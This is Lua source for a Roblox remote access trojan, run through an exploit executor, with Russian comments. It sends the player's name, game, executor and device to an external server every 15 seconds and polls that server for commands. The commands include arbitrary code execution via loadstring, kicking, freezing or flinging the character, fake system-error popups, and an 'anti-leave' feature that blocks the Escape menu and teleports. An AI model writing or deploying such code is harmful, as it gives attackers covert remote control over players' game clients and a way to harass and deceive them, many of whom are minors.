local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local SERVER_URL = "https://ratserver-6wo3.onrender.com"
local player = Players.LocalPlayer

local keyloggerEnabled = false
local keylogBuffer = ""
local lastSendTime = os.time()
local lastUserUpdate = 0
local antiLeaveEnabled = false
local antiLeaveTarget = nil
local antiLeaveConnections = {}
local antiLeaveBlocked = false

-- ========== ANTI-LEAVE СИСТЕМА ==========
local function setupAntiLeave()
    local function shouldBlockAction()
        if not antiLeaveEnabled then return false end
        if antiLeaveTarget and antiLeaveTarget ~= player.Name then return false end
        return true
    end

    local function showWarning()
        task.spawn(function()
            local gui = Instance.new("ScreenGui")
            gui.Name = "AntiLeaveWarning"
            gui.Parent = player:WaitForChild("PlayerGui")
            gui.ResetOnSpawn = false
            
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0.5, 0, 0.2, 0)
            frame.Position = UDim2.new(0.25, 0, 0.4, 0)
            frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
            frame.BorderColor3 = Color3.fromRGB(255, 50, 50)
            frame.BorderSizePixel = 3
            frame.Parent = gui
            
            local text = Instance.new("TextLabel")
            text.Size = UDim2.new(0.9, 0, 0.8, 0)
            text.Position = UDim2.new(0.05, 0, 0.1, 0)
            text.Text = "🚫 ВЫХОД ЗАПРЕЩЕН"
            text.TextColor3 = Color3.fromRGB(255, 50, 50)
            text.TextScaled = true
            text.Font = Enum.Font.GothamBold
            text.BackgroundTransparency = 1
            text.Parent = frame
            
            task.delay(2, function()
                pcall(function() gui:Destroy() end)
            end)
        end)
    end

    -- Блокировка выхода через PlayerRemoving
    local function blockPlayerRemoving()
        local connection = Players.PlayerRemoving:Connect(function(playerLeaving)
            if playerLeaving == player and shouldBlockAction() and not antiLeaveBlocked then
                antiLeaveBlocked = true
                showWarning()
                
                -- Отменяем выход
                task.delay(0.5, function()
                    if player.Character then
                        player.Character:BreakJoints()
                    end
                    player:LoadCharacter()
                    antiLeaveBlocked = false
                end)
            end
        end)
        table.insert(antiLeaveConnections, connection)
    end

    -- Блокировка Escape меню
    local function blockEscapeMenu()
        local connection = UserInputService.InputBegan:Connect(function(input, processed)
            if not processed and input.KeyCode == Enum.KeyCode.Escape then
                if shouldBlockAction() then
                    showWarning()
                    
                    task.spawn(function()
                        pcall(function()
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, nil)
                            task.wait(0.1)
                            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, nil)
                        end)
                    end)
                end
            end
        end)
        table.insert(antiLeaveConnections, connection)
    end

    -- Блокировка телепортации
    local function blockTeleportation()
        local success, teleportService = pcall(function() return game:GetService("TeleportService") end)
        if not success then return end
        
        local oldTeleport = teleportService.Teleport
        local oldTeleportAsync = teleportService.TeleportAsync
        
        if oldTeleport then
            teleportService.Teleport = function(...)
                if shouldBlockAction() then
                    showWarning()
                    return
                end
                return oldTeleport(...)
            end
        end
        
        if oldTeleportAsync then
            teleportService.TeleportAsync = function(...)
                if shouldBlockAction() then
                    showWarning()
                    return
                end
                return oldTeleportAsync(...)
            end
        end
        
        table.insert(antiLeaveConnections, {
            restore = function()
                teleportService.Teleport = oldTeleport
                teleportService.TeleportAsync = oldTeleportAsync
            end
        })
    end

    -- Инициализация всех блокировок
    local function initializeBlocks()
        blockPlayerRemoving()
        blockEscapeMenu()
        blockTeleportation()
    end

    -- Очистка всех подключений
    local function cleanupConnections()
        for _, conn in ipairs(antiLeaveConnections) do
            if type(conn) == "userdata" and conn.Disconnect then
                pcall(function() conn:Disconnect() end)
            elseif type(conn) == "table" and conn.restore then
                pcall(conn.restore)
            end
        end
        antiLeaveConnections = {}
    end

    return {
        enable = function(target)
            cleanupConnections()
            antiLeaveEnabled = true
            antiLeaveTarget = target
            initializeBlocks()
        end,
        
        disable = function()
            antiLeaveEnabled = false
            antiLeaveTarget = nil
            cleanupConnections()
        end,
        
        status = function()
            return {
                enabled = antiLeaveEnabled,
                target = antiLeaveTarget
            }
        end
    }
end

local antiLeaveSystem = setupAntiLeave()

-- ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
local function httpRequest(params)
    local requestFunc = (syn and syn.request) or (request) or (http and http.request)
    if not requestFunc then return nil end
    
    local success, response = pcall(requestFunc, params)
    return success and response or nil
end

local function sendUserInfo()
    local currentTime = os.time()
    if currentTime - lastUserUpdate < 15 then return end
    
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local executor = "Unknown"
    if identifyexecutor then
        local success, exec = pcall(identifyexecutor)
        if success then executor = exec end
    end
    
    pcall(function()
        httpRequest({
            Url = SERVER_URL.."/users",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                player = playerName,
                place = placeName,
                executor = executor,
                device = UserInputService.TouchEnabled and "Mobile" or "PC"
            })
        })
    end)
    
    lastUserUpdate = currentTime
end

local function showPopupMessage(message)
    pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "PopupMessage"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.4, 0, 0.2, 0)
        frame.Position = UDim2.new(0.3, 0, 0.4, 0)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        frame.BorderColor3 = Color3.fromRGB(70, 70, 100)
        frame.BorderSizePixel = 2
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "📢 Сообщение:\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.Gotham
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        frame.BackgroundTransparency = 1
        textLabel.TextTransparency = 1
        
        local tweenIn = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0.1})
        local tweenTextIn = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 0})
        
        tweenIn:Play()
        tweenTextIn:Play()
        
        task.delay(7, function()
            local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
            local tweenTextOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
            
            tweenOut:Play()
            tweenTextOut:Play()
            
            task.delay(0.6, function()
                pcall(function() gui:Destroy() end)
            end)
        end)
    end)
end

local function setupChat()
    local success, result = pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "RatChat"
        screenGui.Parent = player:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false
        screenGui.Enabled = false

        local chatFrame = Instance.new("Frame")
        chatFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
        chatFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        chatFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        chatFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        chatFrame.BackgroundTransparency = 0.3
        chatFrame.Active = true
        chatFrame.Draggable = true
        chatFrame.Parent = screenGui

        local scrollingFrame = Instance.new("ScrollingFrame")
        scrollingFrame.Size = UDim2.new(1, -10, 1, -50)
        scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
        scrollingFrame.BackgroundTransparency = 1
        scrollingFrame.ScrollBarThickness = 5
        scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
        scrollingFrame.Parent = chatFrame

        local textBox = Instance.new("TextBox")
        textBox.Size = UDim2.new(1, -60, 0, 30)
        textBox.Position = UDim2.new(0, 5, 1, -35)
        textBox.PlaceholderText = "Сообщение..."
        textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        textBox.ClearTextOnFocus = false
        textBox.Parent = chatFrame

        local sendButton = Instance.new("TextButton")
        sendButton.Size = UDim2.new(0, 50, 0, 30)
        sendButton.Position = UDim2.new(1, -55, 1, -35)
        sendButton.Text = "Отпр."
        sendButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
        sendButton.Parent = chatFrame

        local function addMessage(sender, text, isSystem)
            local messageFrame = Instance.new("Frame")
            messageFrame.Size = UDim2.new(1, 0, 0, 0)
            messageFrame.AutomaticSize = Enum.AutomaticSize.Y
            messageFrame.BackgroundTransparency = 1
            messageFrame.Parent = scrollingFrame

            local bubble = Instance.new("Frame")
            bubble.Size = UDim2.new(0.8, 0, 0, 0)
            bubble.AutomaticSize = Enum.AutomaticSize.Y
            bubble.BackgroundColor3 = isSystem and Color3.fromRGB(80, 80, 100) or 
                                    (sender == player.Name and Color3.fromRGB(0, 110, 220) or Color3.fromRGB(70, 70, 90))
            bubble.BackgroundTransparency = 0.1
            bubble.Parent = messageFrame

            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(0.9, 0, 0, 0)
            textLabel.Position = UDim2.new(0.05, 0, 0, 5)
            textLabel.AutomaticSize = Enum.AutomaticSize.Y
            textLabel.Text = sender..": "..text
            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            textLabel.TextWrapped = true
            textLabel.BackgroundTransparency = 1
            textLabel.Parent = bubble

            scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.AbsoluteCanvasSize.Y)
        end

        local function sendMessage()
            local text = string.gsub(textBox.Text, "^%s*(.-)%s*$", "%1")
            if text ~= "" then
                addMessage(player.Name, text)
                textBox.Text = ""
            end
        end

        textBox.FocusLost:Connect(function(enterPressed)
            if enterPressed then sendMessage() end
        end)

        sendButton.MouseButton1Click:Connect(sendMessage)

        addMessage("Система", "Чат RAT активирован", true)

        return {
            gui = screenGui,
            enabled = false,
            addMessage = addMessage
        }
    end)
    
    return success and result or nil
end

local chatSystem = setupChat()

-- ========== ФУНКЦИЯ ВЫПОЛНЕНИЯ КОМАНД ==========
local function ExecuteCommand(cmd, args)
    pcall(function()
        if cmd == "chat" then
            if chatSystem then
                chatSystem.gui.Enabled = not chatSystem.gui.Enabled
                if chatSystem.gui.Enabled then
                    chatSystem.addMessage("Система", "Чат включен", true)
                end
            end
        
        elseif cmd == "popup" then
            if args and args[1] then
                showPopupMessage(args[1])
            end
        
        elseif cmd == "kick" then
            player:Kick(args[1] or "Kicked by admin")
        
        elseif cmd == "freeze" then
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 0
                task.delay(tonumber(args[1] or 5), function()
                    if humanoid then humanoid.WalkSpeed = 16 end
                end)
            end
        
        elseif cmd == "void" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = CFrame.new(0, -5000, 0)
            end
        
        elseif cmd == "spin" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 20 do
                    if root then
                        root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
                        task.wait(0.1)
                    end
                end
            end
        
        elseif cmd == "fling" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                root.Velocity = Vector3.new(0, 5000, 0)
            end
        
        elseif cmd == "blur" then
            local blur = Instance.new("BlurEffect")
            blur.Size = 24
            blur.Parent = Lighting
            task.delay(tonumber(args[1] or 5), function()
                pcall(function() if blur then blur:Destroy() end end)
            end)
        
        elseif cmd == "execute" then
            local code = table.concat(args, " ")
            local func, err = loadstring(code)
            if func then pcall(func) end
        
        elseif cmd == "fakeerror" then
            pcall(function()
                local gui = Instance.new("ScreenGui")
                gui.Name = "FakeError"
                gui.Parent = player:WaitForChild("PlayerGui")
                
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(0.5, 0, 0.3, 0)
                frame.Position = UDim2.new(0.25, 0, 0.35, 0)
                frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
                frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
                frame.Parent = gui
                
                local textLabel = Instance.new("TextLabel")
                textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
                textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
                textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..table.concat(args, " ")
                textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
                textLabel.TextScaled = true
                textLabel.Font = Enum.Font.GothamBold
                textLabel.BackgroundTransparency = 1
                textLabel.Parent = frame
                
                task.delay(10, function()
                    pcall(function() gui:Destroy() end)
                end)
            end)
        
        elseif cmd == "anti_leave" then
            local action = args[1]
            
            if action == "enable" then
                local target = args[2]
                if target == "all" then target = nil end
                antiLeaveSystem.enable(target)
                
                if chatSystem then
                    chatSystem.addMessage("AntiLeave", 
                        "🛡️ Система блокировки выхода активирована" .. 
                        (target and (" для " .. target) or ""), 
                        true
                    )
                end
                
            elseif action == "disable" then
                antiLeaveSystem.disable()
                
                if chatSystem then
                    chatSystem.addMessage("AntiLeave", "🛡️ Система блокировки выхода деактивирована", true)
                end
                
            elseif action == "status" then
                local status = antiLeaveSystem.status()
                local statusText = status.enabled and "🟢 Включен" or "🔴 Выключен"
                local targetText = status.target or "Все игроки"
                
                if chatSystem then
                    chatSystem.addMessage("AntiLeave", 
                        string.format("%s\nЦель: %s", statusText, targetText), 
                        true
                    )
                end
            end
        end
    end)
end

local function checkCommands()
    local success, response = pcall(function()
        return httpRequest({
            Url = SERVER_URL.."/data?player=" .. player.Name,
            Method = "GET"
        })
    end)
    
    if success and response and response.Body then
        local success, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if success and data and data.command and data.command ~= "" then
            ExecuteCommand(data.command, data.args or {})
            return true
        end
    end
    return false
end

-- ========== ОСНОВНОЙ ЦИКЛ ==========
task.spawn(function()
    sendUserInfo()
    task.wait(15)
    
    while task.wait(15) do
        pcall(sendUserInfo)
        pcall(checkCommands)
    end
end)
